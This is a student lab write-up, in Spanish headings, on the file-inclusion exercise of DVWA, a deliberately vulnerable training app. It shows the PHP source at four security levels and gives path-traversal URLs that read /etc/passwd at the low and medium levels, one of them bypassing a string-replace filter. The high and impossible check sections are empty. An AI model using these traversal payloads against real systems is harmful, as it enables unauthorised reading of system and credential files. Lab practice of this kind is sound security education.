# FI

## Nivel: `bajo`

### source

```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

?> 
```

### vulnerability check

```
http://localhost/DVWA/vulnerabilities/fi/?page=../../../../../../etc/passwd
```

![check1](https://github.com/Hec7or-Uni/seginf-pr-5/blob/main/FI/assets/check1.png)

## Nivel: `medio`

### source

```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\\" ), "", $file );

?> 
```

### vulnerability check

```
http://localhost/DVWA/vulnerabilities/fi/?page=....//....//....//....//....//....//etc/passwd
```

![check2](https://github.com/Hec7or-Uni/seginf-pr-5/blob/main/FI/assets/check2.png)

## Nivel: `alto`

### source

```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}

?> 
```

### vulnerability check


## Nivel: `imposible`

### source

```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Only allow include.php or file{1..3}.php
if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}

?> 
```

### vulnerability check


## Referencias

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [HTB Academy](https://academy.hackthebox.com/module/77/section/725)
